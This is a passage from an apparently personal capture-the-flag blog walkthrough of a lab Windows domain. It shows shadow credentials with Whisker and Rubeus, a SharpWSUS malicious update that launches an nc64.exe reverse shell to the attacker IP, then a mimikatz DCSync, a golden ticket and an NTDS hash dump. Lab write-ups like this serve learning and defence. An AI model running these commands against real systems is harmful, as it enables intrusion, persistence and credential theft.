    -   `curl http://10.10.14.43:9000/Whisker.exe -o w.exe`
    -   {{< figure src="/ox-hugo/2024-10-11-163701_.png" >}}
    -   I call it `w.exe` for no reason other than speed when typing.

-   **I set the shadow credentials on the user** `sflowers`:
    -   `w.exe add /target:sflowers /domain:outdated.htb`
    -   {{< figure src="/ox-hugo/2024-10-11-141932_.png" >}}
    -   +Note+: What is great about `whisker` is that spits out the exact command you will need to run in `rubeus`.


### I use the base64 encoded certificate to request a `TGT` for `sflowers` using rubeus: {#i-use-the-base64-encoded-certificate-to-request-a-tgt-for-sflowers-using-rubeus}

-   **I run rubeus and pass it the base64 encoded certificate &amp; password**:
    -   `r.exe asktgt /user:sflowers /certificate:<base64Cert> /password:"sA1JSl1rVtabQdMp" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show`

-   **Rubeus Command Explained**:
    -   Uses the certificate to request a Kerberos TGT for Susan Flowers (sflowers)
    -   The `/certificate` parameter contains the Base64-encoded certificate
    -   The `/password` is for the private key, not Susan's actual AD password
    -   The `/getcredentials` flag attempts to decrypt the encrypted NTLM hash from the TGT
    -   The `/show` flag displays the ticket details and other information
    -   If successful, Rubeus receives a TGT and can extract the NTLM hash

-   **As a result of this process**:
    -   Rubeus obtains a TGT for Susan Flowers (sflowers) &amp; generates a `.kirbi` file which can be used for pass-the-ticket attacks.
        -   {{< figure src="/ox-hugo/2024-10-11-142105_.png" >}}
    -   It also extracts and displays the user's NTLM hash (due to the `/getcredentials` flag)
        -   {{< figure src="/ox-hugo/2024-10-11-142111_.png" >}}
    -   The ticket details and other information are shown in the output (due to the `/show` flag)

-   **I check the** `NTLM` **hash is valid using** `netexec`:
    -   `netexec smb $box -u $user -H $hash --share`
    -   {{< figure src="/ox-hugo/2024-10-11-165050_.png" >}}
    -   We can see we have read &amp; write access to the `WSUS` shares now.
    -   +Note+: I actually had to restart the box as I was getting some strange errors when trying to authenticate to SMB as `sflowers`


### Enumerating the Host as `slfowers`: {#enumerating-the-host-as-slfowers}

-   **I connect with** `evil-winrm`:
    -   `evil-winrm -i $box -u $user -H $hash`

-   **Get the flag**:
    -   {{< figure src="/ox-hugo/2024-10-11-143311_.png" >}}

-   **I see that** `PsExec64.exe` **binary is also on the desktop**:
    -   {{< figure src="/ox-hugo/2024-10-11-165303_.png" >}}


### Seeing `sflowers` has outbound object control over the `CA`: {#seeing-sflowers-has-outbound-object-control-over-the-ca}

-   **I see in bloodhound that sflowers has outbound object control over the** `CA`:
    -   {{< figure src="/ox-hugo/2024-10-11-144117_.png" >}}

-   **I run** `certipy-ad` **to see if there are any vulnerable certs**:
    -   `certipy-ad find -vulnerable -enabled -u $user@$domain -hashes :$hash -dc-ip $box`
    -   {{< figure src="/ox-hugo/2024-10-11-144001_.png" >}}
    -   I check but there are no vulnerable certs


### Discovering `sflowers` is part of the wsus administrators group: {#discovering-sflowers-is-part-of-the-wsus-administrators-group}

-   **Looking at** `sflowers` **group memberships we can see she is part of the** `wsus administrators` **group**:
    -   {{< figure src="/ox-hugo/2024-10-11-201058_.png" >}}
    -   This could be a viable attack path as if we can push a malicious update via `wsus` we may be able to escalate our privileges:


### What is `WSUS` (Windows Server Update Services)? {#what-is-wsus--windows-server-update-services}

-   WSUS (Windows Server Update Services) is a critical component in many corporate Windows environments. It allows administrators to manage and distribute updates centrally.


#### WSUS Architecture: {#wsus-architecture}

-   **Typical deployment**:
    -   One WSUS server in the corporate network
    -   Downloads patches from Microsoft via `HTTP/HTTPS`
    -   Deploys patches to clients as they check in
    -   Client communication:
        -   `HTTP` (port 8530)
        -   `HTTPS` (port 8531)
    -   {{< figure src="/ox-hugo/2024-10-11-181805_.png" >}}

-   **More complex deployments may involve**:
    -   Upstream server: Connects to Microsoft, downloads updates
    -   Downstream servers: Receive updates from upstream, distribute to clients
    -   {{< figure src="/ox-hugo/2024-10-11-181911_.png" >}}


## 4. Privilege Escalation: {#4-dot-privilege-escalation}


### Manually Enumerating the `WSUS` Service by querying the registry: {#manually-enumerating-the-wsus-service-by-querying-the-registry}


#### Enumerating the Primary WSUS Settings: {#enumerating-the-primary-wsus-settings}

-   **To query the main WSUS settings, use the following command**:
    -   `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate`
    -   {{< figure src="/ox-hugo/2024-10-11-200931_.png" >}}

<!--listend-->

```powershell
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    SetActiveHours    REG_DWORD     0x1
    ActiveHoursStart    REG_DWORD     0x0
    ActiveHoursEnd    REG_DWORD     0x17
    AcceptTrustedPublisherCerts    REG_DWORD     0x1
    ExcludeWUDriversInQualityUpdate    REG_DWORD     0x1
    DoNotConnectToWindowsUpdateInternetLocations    REG_DWORD     0x1
    WUServer    REG_SZ     http://wsus.outdated.htb:8530
    WUStatusServer    REG_SZ     http://wsus.outdated.htb:8530
    UpdateServiceUrlAlternate    REG_SZ
```

-   **Key Findings**:
    -   `SetActiveHours`:
        -   `ActiveHoursStart` Start = 0x0 (12:00 AM)
        -   `ActiveHoursEnd` End = 0x17 (11:00 PM)
        -   Updates are allowed to install at any time

    -   `AcceptTrustedPublisherCerts = 1`
        -   The system accepts certificates from trusted publishers for updates

    -   `DoNotConnectToWindowsUpdateInternetLocations = 1`
        -   The system is configured to not connect directly to Windows Update
        -   All updates must come through the WSUS server

    -   `WSUSServer`:
        -   <http://wsus.outdated.htb:8530>
        -   This is the central update server for the organization
        -   **Connection Security: HTTP (unencrypted)**:
            -   The connection to the WSUS server uses HTTP instead of HTTPS
                -   Seen in the url  <http://wsus.outdated.htb:8530> &amp; that it's using port 8530
            -   This could potentially expose update traffic to interception


#### Enumerating the Automatic Update Settings: {#enumerating-the-automatic-update-settings}

-   **To query specific automatic update settings**:
    -   `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU`
    -   {{< figure src="/ox-hugo/2024-10-11-200951_.png" >}}

<!--listend-->

```powershell
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
    AutoInstallMinorUpdates    REG_DWORD     0x1
    NoAutoUpdate    REG_DWORD     0x0
    AUOptions    REG_DWORD     0x3
    ScheduledInstallDay    REG_DWORD     0x0
    ScheduledInstallTime    REG_DWORD     0x3
    ScheduledInstallEveryWeek    REG_DWORD     0x1
    UseWUServer    REG_DWORD     0x1
```

-   **Key Findings**:
    -   `AutoInstallMinorUpdates = 1`
        -   Minor Updates: Auto-install
        -   Small updates are installed without user intervention

    -   `NoAutoUpdate = 0`
        -   Automatic Updates: Enabled
        -   The system will automatically check for and download updates

    -   `AUOptions = 3`
        -   Update Installation: Automatic:
        -   Updates will be downloaded and installed automatically

    -   `ScheduledInstallEveryWeek = 1`
        -   Update Schedule:
            -   Day: 0 (Every day)
            -   Time: 3 (3:00 AM)
            -   Frequency: Weekly

    -   `UseWUServer = 1`
        -   Update Source: WSUS Server
        -   Confirms that the system is using the configured WSUS server


#### Analysis and Implications of the results: {#analysis-and-implications-of-the-results}

-   **Security Concerns**: The use of an unencrypted HTTP connection to the WSUS server could pose a security risk, potentially allowing for man-in-the-middle attacks.
    -   E.G. Us right now.

-   **Automatic Update Behavior**: The system is set to automatically install updates, which helps maintain system security but also means if we push an update it will be automatically installed!

-   **Update Control**: The system is fully reliant on the WSUS server for updates, as it's configured not to connect to Windows Update directly.

-   **Scheduled Updates**: Updates are scheduled to install weekly `ScheduledInstallEveryWeek = 1`, which suggests a regular maintenance window.

-   **Attack Path**:
    -   I will attempt to push a malicious update using the tool [SharpWSUS](https://github.com/nettitude/SharpWSUS)


### Using [SharpWSUS](https://github.com/nettitude/SharpWSUS) to push a malicious update: {#using-sharpwsus-to-push-a-malicious-update}


#### Building [SharpWSUS](https://github.com/nettitude/SharpWSUS): {#building-sharpwsus}

-   **Again I don't have a sharpWSUS binary in my common binaries so will have to build it**:
    -   I open up my windows VM.
    -   Clone the repo.
        -   `git clone https://github.com/nettitude/SharpWSUS.git`
    -   Open up Visual `Studio 2022`
        -   {{< figure src="/ox-hugo/2024-10-12-075608_.png" >}}
    -   Build &amp; voila a nice new `sharpWSUS.exe` binary.


#### Using `SharpWSUS` to trigger a reverse shell as system: {#using-sharpwsus-to-trigger-a-reverse-shell-as-system}

-   **Looking at the creators blog-post about the tool I see the following paragraph**:

> While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL on a network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog will use PsExec.exe for code execution (<https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>).
>
> A patch leveraging PsExec.exe can be done with the following command:
>
> SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \\"net user WSUSDemo Password123! /add &amp;&amp; net localgroup administrators WSUSDemo /add\\"" /title:"WSUSDemo"

-   <https://labs.nettitude.com/blog/introducing-sharpwsus/>
-   If you remember correctly `sflowers` had a `PsExec64.exe` binary on her desktop so this gives us a valid attack path.


##### Creating a Malicious Update with `SharpWSUS`: {#creating-a-malicious-update-with-sharpwsus}

-   **I create my** `SharpWSUS` **payload to trigger an** `nc64.exe` **binary I have uploaded**
    -   `.\SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d C:\Users\sflowers\Documents\nc64.exe -e cmd.exe 10.10.14.43 443" /title:"EmergencyUpdate"`
    -   {{< figure src="/ox-hugo/2024-10-12-082517_.png" >}}
    -   +Note+: You can see at the bottom of the output it tells us the next command we need to run in order to push this malicious update.


##### Approving our Malicious Update with `SharpWSUS`: {#approving-our-malicious-update-with-sharpwsus}

-   **Approve the update**:
    -   `.\SharpWSUS.exe approve /updateid:bdf7d92c-2b96-42c3-b615-fc207c9d49af /computername:dc.outdated.htb /groupname:"EmergencyUpdate"`
    -   {{< figure src="/ox-hugo/2024-10-12-082756_.png" >}}
    -   +Note+:
        -   Be patient it can take a minute or longer in real life depending on update schedules etc.
            -   In real life this could take upto a week etc if updates are only pushed weekly and under certain circumstances.
        -   `/groupname:` = the `/title:` we set in the previous step e.g. `"EmergencyUpdate"`
        -   Remember to modify the `/computername:` to be the FQDN of the target you are attacking.

-   **Shell Caught**:
    -   {{< figure src="/ox-hugo/2024-10-12-082736_.png" >}}


## 4. Persistence: {#4-dot-persistence}


### Creating a golden ticket with `mimikatz.exe`: {#creating-a-golden-ticket-with-mimikatz-dot-exe}

-   **I upload mimikatz via the existin evil-winrm session with** `sflowers`:
    -   I perform a dcsync attack and dump the krbtgt hash:
    -   `lsadump::dcsync /user:krbtgt /domain:outdated.htb`
    -   {{< figure src="/ox-hugo/2024-10-12-084028_.png" >}}
    -   I get the `SID`, `KRBTGT NTLM` hash which is all I need to perform my Golden Ticket Attack.

-   **I create my golden ticket**:
    -   `kerberos::golden /domain:outdated.htb /user:Administrator /sid:S-1-5-21-4089647348-67660539-4016542185 /rc4:<redacted>`
    -   {{< figure src="/ox-hugo/2024-10-12-084203_.png" >}}

-   **I transfer the ticket via** `evil-winrm`:

-   **Convert with** `impacket-ticketconverter`:
    -   `impacket-ticketConverter ticket.kirbi admin.ccache`
    -   {{< figure src="/ox-hugo/2024-10-12-084327_.png" >}}

-   **Import into session my current session**:
    -   `export KRB5CCNAME=./admin.ccache`
    -   {{< figure src="/ox-hugo/2024-10-12-084407_.png" >}}

-   **Syncronise my time with the Domain Controller**:
    -   `sudo ntpdate -s dc.$domain`
    -   {{< figure src="/ox-hugo/2024-10-12-084444_.png" >}}
    -   +Note+: As kerberos uses time based security checks this is important

-   **Check the ticket is in memory**:
    -   `klist`
    -   {{< figure src="/ox-hugo/2024-10-12-084641_.png" >}}
    -   If you look we can see this ticket is valid for 10 years so as long no-one changes the `krbtgt` password (which is unlikely) we will have persistence.

-   **Connect Using my ticket using** `impacket-psexec`:
    -   `impacket-psexec dc.$domain -k`
    -   {{< figure src="/ox-hugo/2024-10-12-084756_.png" >}}


### Dumping NTDS for fun for fun and profit: {#dumping-ntds-for-fun-for-fun-and-profit}

-   Now that we have persistence we might as well pillage:

-   **I perform a DCSync attack using netexec and dump all hashes**:
    -   `netexec smb $box -u administrator --use-kcache -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-10-12-085001_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned about the follina exploit, I had never used that exploit previously so was interesting using purely the malicious HTML part as a delivery mechanism for our exploit.
2.  I learned a lot about WSUS. Looking at the different architecture options available and how to query the registry was interesting from an enumeration point of view.
3.  I learned about the process of doing a shadow credentials attack. I even stopped the box halfway to do a deep-dive and made a blog post I found it so interesting:
    -   <https://bloodstiller.com/articles/shadowcredentialsattack/>


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Trying to download to `C:\\Temp\\` you know the FAMOUS non-existent directory in windows!
2.  I had a couple of real dense moments when I was tired &amp; over-thinking about how I could use the malicious Follina `html` instead of just sending the link.
3.  Oh, for some reason I kept forgetting to add the title with SharpWSUS.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me




